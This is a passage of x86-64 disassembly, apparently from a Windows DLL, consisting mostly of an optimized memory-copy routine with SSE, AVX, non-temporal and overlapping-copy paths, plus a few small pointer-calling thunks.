   180005cd9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   180005cde:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   180005ce3:	48 8b 12             	mov    (%rdx),%rdx
   180005ce6:	48 8b c1             	mov    %rcx,%rax
   180005ce9:	e8 32 fc ff ff       	call   0x180005920
   180005cee:	ff d0                	call   *%rax
   180005cf0:	e8 5b fc ff ff       	call   0x180005950
   180005cf5:	48 83 c4 28          	add    $0x28,%rsp
   180005cf9:	c3                   	ret
   180005cfa:	cc                   	int3
   180005cfb:	cc                   	int3
   180005cfc:	cc                   	int3
   180005cfd:	cc                   	int3
   180005cfe:	cc                   	int3
   180005cff:	cc                   	int3
   180005d00:	48 83 ec 28          	sub    $0x28,%rsp
   180005d04:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180005d09:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   180005d0e:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180005d13:	48 8b 12             	mov    (%rdx),%rdx
   180005d16:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180005d1c:	e8 ff fb ff ff       	call   0x180005920
   180005d21:	48 83 c4 28          	add    $0x28,%rsp
   180005d25:	c3                   	ret
   180005d26:	cc                   	int3
   180005d27:	cc                   	int3
   180005d28:	cc                   	int3
   180005d29:	cc                   	int3
   180005d2a:	cc                   	int3
   180005d2b:	cc                   	int3
   180005d2c:	0f 1f 40 00          	nopl   0x0(%rax)
   180005d30:	48 83 ec 28          	sub    $0x28,%rsp
   180005d34:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180005d39:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   180005d3e:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   180005d43:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   180005d48:	45 8b c1             	mov    %r9d,%r8d
   180005d4b:	48 8b c1             	mov    %rcx,%rax
   180005d4e:	e8 cd fb ff ff       	call   0x180005920
   180005d53:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   180005d58:	ff d0                	call   *%rax
   180005d5a:	e8 f1 fb ff ff       	call   0x180005950
   180005d5f:	48 8b c8             	mov    %rax,%rcx
   180005d62:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180005d67:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180005d6d:	e8 ae fb ff ff       	call   0x180005920
   180005d72:	48 83 c4 28          	add    $0x28,%rsp
   180005d76:	c3                   	ret
   180005d77:	cc                   	int3
   180005d78:	cc                   	int3
   180005d79:	cc                   	int3
   180005d7a:	cc                   	int3
   180005d7b:	cc                   	int3
   180005d7c:	cc                   	int3
   180005d7d:	cc                   	int3
   180005d7e:	cc                   	int3
   180005d7f:	cc                   	int3
   180005d80:	cc                   	int3
   180005d81:	cc                   	int3
   180005d82:	cc                   	int3
   180005d83:	cc                   	int3
   180005d84:	cc                   	int3
   180005d85:	cc                   	int3
   180005d86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005d8d:	00 00 00 
   180005d90:	57                   	push   %rdi
   180005d91:	56                   	push   %rsi
   180005d92:	48 8b f9             	mov    %rcx,%rdi
   180005d95:	48 8b f2             	mov    %rdx,%rsi
   180005d98:	49 8b c8             	mov    %r8,%rcx
   180005d9b:	f3 a4                	rep movsb (%rsi),(%rdi)
   180005d9d:	5e                   	pop    %rsi
   180005d9e:	5f                   	pop    %rdi
   180005d9f:	c3                   	ret
   180005da0:	cc                   	int3
   180005da1:	cc                   	int3
   180005da2:	cc                   	int3
   180005da3:	cc                   	int3
   180005da4:	cc                   	int3
   180005da5:	cc                   	int3
   180005da6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005dad:	00 00 00 
   180005db0:	48 8b c1             	mov    %rcx,%rax
   180005db3:	4c 8d 15 46 a2 ff ff 	lea    -0x5dba(%rip),%r10        # 0x180000000
   180005dba:	49 83 f8 0f          	cmp    $0xf,%r8
   180005dbe:	0f 87 0c 01 00 00    	ja     0x180005ed0
   180005dc4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   180005dcb:	00 00 00 00 00 
   180005dd0:	47 8b 8c 82 50 e0 01 	mov    0x1e050(%r10,%r8,4),%r9d
   180005dd7:	00 
   180005dd8:	4d 03 ca             	add    %r10,%r9
   180005ddb:	41 ff e1             	jmp    *%r9
   180005dde:	c3                   	ret
   180005ddf:	90                   	nop
   180005de0:	4c 8b 02             	mov    (%rdx),%r8
   180005de3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   180005de6:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   180005deb:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   180005df0:	4c 89 00             	mov    %r8,(%rax)
   180005df3:	89 48 08             	mov    %ecx,0x8(%rax)
   180005df6:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   180005dfb:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   180005dff:	c3                   	ret
   180005e00:	4c 8b 02             	mov    (%rdx),%r8
   180005e03:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   180005e07:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   180005e0c:	4c 89 00             	mov    %r8,(%rax)
   180005e0f:	66 89 48 08          	mov    %cx,0x8(%rax)
   180005e13:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   180005e17:	c3                   	ret
   180005e18:	0f b7 0a             	movzwl (%rdx),%ecx
   180005e1b:	66 89 08             	mov    %cx,(%rax)
   180005e1e:	c3                   	ret
   180005e1f:	90                   	nop
   180005e20:	8b 0a                	mov    (%rdx),%ecx
   180005e22:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   180005e27:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   180005e2c:	89 08                	mov    %ecx,(%rax)
   180005e2e:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   180005e33:	44 88 48 06          	mov    %r9b,0x6(%rax)
   180005e37:	c3                   	ret
   180005e38:	4c 8b 02             	mov    (%rdx),%r8
   180005e3b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   180005e3e:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   180005e43:	4c 89 00             	mov    %r8,(%rax)
   180005e46:	89 48 08             	mov    %ecx,0x8(%rax)
   180005e49:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   180005e4e:	c3                   	ret
   180005e4f:	0f b7 0a             	movzwl (%rdx),%ecx
   180005e52:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   180005e57:	66 89 08             	mov    %cx,(%rax)
   180005e5a:	44 88 40 02          	mov    %r8b,0x2(%rax)
   180005e5e:	c3                   	ret
   180005e5f:	90                   	nop
   180005e60:	4c 8b 02             	mov    (%rdx),%r8
   180005e63:	8b 4a 08             	mov    0x8(%rdx),%ecx
   180005e66:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   180005e6b:	4c 89 00             	mov    %r8,(%rax)
   180005e6e:	89 48 08             	mov    %ecx,0x8(%rax)
   180005e71:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   180005e75:	c3                   	ret
   180005e76:	4c 8b 02             	mov    (%rdx),%r8
   180005e79:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   180005e7d:	4c 89 00             	mov    %r8,(%rax)
   180005e80:	66 89 48 08          	mov    %cx,0x8(%rax)
   180005e84:	c3                   	ret
   180005e85:	4c 8b 02             	mov    (%rdx),%r8
   180005e88:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   180005e8c:	4c 89 00             	mov    %r8,(%rax)
   180005e8f:	88 48 08             	mov    %cl,0x8(%rax)
   180005e92:	c3                   	ret
   180005e93:	4c 8b 02             	mov    (%rdx),%r8
   180005e96:	8b 4a 08             	mov    0x8(%rdx),%ecx
   180005e99:	4c 89 00             	mov    %r8,(%rax)
   180005e9c:	89 48 08             	mov    %ecx,0x8(%rax)
   180005e9f:	c3                   	ret
   180005ea0:	8b 0a                	mov    (%rdx),%ecx
   180005ea2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   180005ea7:	89 08                	mov    %ecx,(%rax)
   180005ea9:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   180005eae:	c3                   	ret
   180005eaf:	8b 0a                	mov    (%rdx),%ecx
   180005eb1:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   180005eb6:	89 08                	mov    %ecx,(%rax)
   180005eb8:	44 88 40 04          	mov    %r8b,0x4(%rax)
   180005ebc:	c3                   	ret
   180005ebd:	48 8b 0a             	mov    (%rdx),%rcx
   180005ec0:	48 89 08             	mov    %rcx,(%rax)
   180005ec3:	c3                   	ret
   180005ec4:	0f b6 0a             	movzbl (%rdx),%ecx
   180005ec7:	88 08                	mov    %cl,(%rax)
   180005ec9:	c3                   	ret
   180005eca:	8b 0a                	mov    (%rdx),%ecx
   180005ecc:	89 08                	mov    %ecx,(%rax)
   180005ece:	c3                   	ret
   180005ecf:	90                   	nop
   180005ed0:	49 83 f8 20          	cmp    $0x20,%r8
   180005ed4:	77 17                	ja     0x180005eed
   180005ed6:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   180005eda:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   180005ee1:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   180005ee5:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   180005eec:	c3                   	ret
   180005eed:	48 3b d1             	cmp    %rcx,%rdx
   180005ef0:	73 0e                	jae    0x180005f00
   180005ef2:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   180005ef6:	49 3b c9             	cmp    %r9,%rcx
   180005ef9:	0f 82 41 04 00 00    	jb     0x180006340
   180005eff:	90                   	nop
   180005f00:	83 3d 11 41 01 00 03 	cmpl   $0x3,0x14111(%rip)        # 0x18001a018
   180005f07:	0f 82 e3 02 00 00    	jb     0x1800061f0
   180005f0d:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   180005f14:	76 16                	jbe    0x180005f2c
   180005f16:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   180005f1d:	77 0d                	ja     0x180005f2c
   180005f1f:	f6 05 9a 51 01 00 02 	testb  $0x2,0x1519a(%rip)        # 0x18001b0c0
   180005f26:	0f 85 64 fe ff ff    	jne    0x180005d90
   180005f2c:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   180005f30:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   180005f37:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   180005f3e:	0f 86 c4 00 00 00    	jbe    0x180006008
   180005f44:	4c 8b c9             	mov    %rcx,%r9
   180005f47:	49 83 e1 1f          	and    $0x1f,%r9
   180005f4b:	49 83 e9 20          	sub    $0x20,%r9
   180005f4f:	49 2b c9             	sub    %r9,%rcx
   180005f52:	49 2b d1             	sub    %r9,%rdx
   180005f55:	4d 03 c1             	add    %r9,%r8
   180005f58:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   180005f5f:	0f 86 a3 00 00 00    	jbe    0x180006008
   180005f65:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   180005f6c:	0f 87 3e 01 00 00    	ja     0x1800060b0
   180005f72:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   180005f79:	1f 84 00 00 00 00 00 
   180005f80:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   180005f84:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   180005f89:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   180005f8e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   180005f93:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   180005f97:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   180005f9c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   180005fa1:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   180005fa6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   180005fad:	00 
   180005fae:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   180005fb5:	00 
   180005fb6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   180005fbd:	00 
   180005fbe:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   180005fc5:	00 
   180005fc6:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   180005fcd:	00 
   180005fce:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   180005fd5:	00 
   180005fd6:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   180005fdd:	00 
   180005fde:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   180005fe5:	00 
   180005fe6:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   180005fed:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   180005ff4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   180005ffb:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   180006002:	0f 83 78 ff ff ff    	jae    0x180005f80
   180006008:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   18000600c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   180006010:	4d 8b d9             	mov    %r9,%r11
   180006013:	49 c1 eb 05          	shr    $0x5,%r11
   180006017:	47 8b 9c 9a 90 e0 01 	mov    0x1e090(%r10,%r11,4),%r11d
   18000601e:	00 
   18000601f:	4d 03 da             	add    %r10,%r11
   180006022:	41 ff e3             	jmp    *%r11
   180006025:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   18000602c:	ff ff ff 
   18000602f:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   180006036:	ff ff ff 
   180006039:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   180006040:	ff ff ff 
   180006043:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   18000604a:	ff ff ff 
   18000604d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   180006054:	ff ff ff 
   180006057:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   18000605e:	ff ff ff 
   180006061:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   180006068:	ff ff ff 
   18000606b:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   180006072:	ff ff ff 
   180006075:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   18000607c:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   180006083:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   18000608a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   180006091:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   180006098:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   18000609f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   1800060a6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   1800060aa:	c5 f8 77             	vzeroupper
   1800060ad:	c3                   	ret
   1800060ae:	66 90                	xchg   %ax,%ax
   1800060b0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   1800060b4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   1800060b9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   1800060be:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   1800060c3:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   1800060c7:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   1800060cc:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   1800060d1:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   1800060d6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   1800060dd:	00 
   1800060de:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   1800060e5:	00 
   1800060e6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   1800060ed:	00 
   1800060ee:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   1800060f5:	00 
   1800060f6:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   1800060fd:	00 
   1800060fe:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   180006105:	00 
   180006106:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   18000610d:	00 
   18000610e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   180006115:	00 
   180006116:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   18000611d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   180006124:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   18000612b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   180006132:	0f 83 78 ff ff ff    	jae    0x1800060b0
   180006138:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   18000613c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   180006140:	4d 8b d9             	mov    %r9,%r11
   180006143:	49 c1 eb 05          	shr    $0x5,%r11
   180006147:	47 8b 9c 9a b4 e0 01 	mov    0x1e0b4(%r10,%r11,4),%r11d
   18000614e:	00 
   18000614f:	4d 03 da             	add    %r10,%r11
   180006152:	41 ff e3             	jmp    *%r11
   180006155:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   18000615c:	ff ff ff 
   18000615f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   180006166:	ff ff ff 
   180006169:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   180006170:	ff ff ff 
   180006173:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   18000617a:	ff ff ff 
   18000617d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   180006184:	ff ff ff 
   180006187:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   18000618e:	ff ff ff 
   180006191:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   180006198:	ff ff ff 
   18000619b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   1800061a2:	ff ff ff 
   1800061a5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   1800061ac:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   1800061b3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   1800061ba:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   1800061c1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   1800061c8:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   1800061cf:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   1800061d6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   1800061da:	0f ae f8             	sfence
   1800061dd:	c5 f8 77             	vzeroupper
   1800061e0:	c3                   	ret
   1800061e1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1800061e8:	0f 1f 84 00 00 00 00 
   1800061ef:	00 
   1800061f0:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   1800061f7:	76 0d                	jbe    0x180006206
   1800061f9:	f6 05 c0 4e 01 00 02 	testb  $0x2,0x14ec0(%rip)        # 0x18001b0c0
   180006200:	0f 85 8a fb ff ff    	jne    0x180005d90
   180006206:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   18000620a:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   180006211:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   180006218:	0f 86 8e 00 00 00    	jbe    0x1800062ac
   18000621e:	4c 8b c9             	mov    %rcx,%r9
   180006221:	49 83 e1 0f          	and    $0xf,%r9
   180006225:	49 83 e9 10          	sub    $0x10,%r9
   180006229:	49 2b c9             	sub    %r9,%rcx
   18000622c:	49 2b d1             	sub    %r9,%rdx
   18000622f:	4d 03 c1             	add    %r9,%r8
   180006232:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   180006239:	76 71                	jbe    0x1800062ac
   18000623b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180006240:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   180006244:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   180006249:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   18000624e:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   180006253:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   180006257:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   18000625c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   180006261:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   180006266:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   18000626b:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   180006270:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   180006275:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   18000627a:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   18000627f:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   180006284:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   180006289:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   18000628e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   180006295:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   18000629c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   1800062a3:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1800062aa:	73 94                	jae    0x180006240
   1800062ac:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   1800062b0:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   1800062b4:	4d 8b d9             	mov    %r9,%r11
   1800062b7:	49 c1 eb 04          	shr    $0x4,%r11
   1800062bb:	47 8b 9c 9a d8 e0 01 	mov    0x1e0d8(%r10,%r11,4),%r11d
   1800062c2:	00 
   1800062c3:	4d 03 da             	add    %r10,%r11
   1800062c6:	41 ff e3             	jmp    *%r11
   1800062c9:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   1800062d0:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   1800062d7:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   1800062de:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   1800062e5:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   1800062ec:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   1800062f3:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   1800062fa:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   180006301:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   180006308:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   18000630f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   180006316:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   18000631d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   180006324:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   18000632b:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   180006332:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   180006336:	c3                   	ret
   180006337:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000633e:	00 00 
   180006340:	4c 8b d9             	mov    %rcx,%r11
   180006343:	4c 8b d2             	mov    %rdx,%r10
   180006346:	48 2b d1             	sub    %rcx,%rdx
   180006349:	49 03 c8             	add    %r8,%rcx
   18000634c:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   180006351:	48 83 e9 10          	sub    $0x10,%rcx
   180006355:	49 83 e8 10          	sub    $0x10,%r8
   180006359:	f6 c1 0f             	test   $0xf,%cl
   18000635c:	74 17                	je     0x180006375
   18000635e:	48 8b c1             	mov    %rcx,%rax
   180006361:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   180006365:	0f 10 c8             	movups %xmm0,%xmm1
   180006368:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   18000636c:	0f 11 08             	movups %xmm1,(%rax)
   18000636f:	4c 8b c1             	mov    %rcx,%r8
   180006372:	4d 2b c3             	sub    %r11,%r8
   180006375:	4d 8b c8             	mov    %r8,%r9
   180006378:	49 c1 e9 07          	shr    $0x7,%r9
   18000637c:	74 6f                	je     0x1800063ed
   18000637e:	0f 29 01             	movaps %xmm0,(%rcx)
   180006381:	eb 14                	jmp    0x180006397
   180006383:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000638a:	84 00 00 00 00 00 
   180006390:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   180006394:	0f 29 09             	movaps %xmm1,(%rcx)
   180006397:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   18000639c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   1800063a1:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   1800063a8:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   1800063ac:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   1800063b0:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   1800063b5:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   1800063ba:	49 ff c9             	dec    %r9
   1800063bd:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   1800063c1:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   1800063c5:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   1800063ca:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   1800063cf:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   1800063d3:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   1800063d7:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   1800063dc:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   1800063e0:	75 ae                	jne    0x180006390
   1800063e2:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1800063e6:	49 83 e0 7f          	and    $0x7f,%r8
   1800063ea:	0f 28 c1             	movaps %xmm1,%xmm0
   1800063ed:	4d 8b c8             	mov    %r8,%r9
   1800063f0:	49 c1 e9 04          	shr    $0x4,%r9
   1800063f4:	74 1a                	je     0x180006410
   1800063f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800063fd:	00 00 00 
   180006400:	0f 11 01             	movups %xmm0,(%rcx)
   180006403:	48 83 e9 10          	sub    $0x10,%rcx
   180006407:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   18000640b:	49 ff c9             	dec    %r9
   18000640e:	75 f0                	jne    0x180006400
   180006410:	49 83 e0 0f          	and    $0xf,%r8
   180006414:	74 08                	je     0x18000641e
   180006416:	41 0f 10 0a          	movups (%r10),%xmm1
   18000641a:	41 0f 11 0b          	movups %xmm1,(%r11)
   18000641e:	0f 11 01             	movups %xmm0,(%rcx)
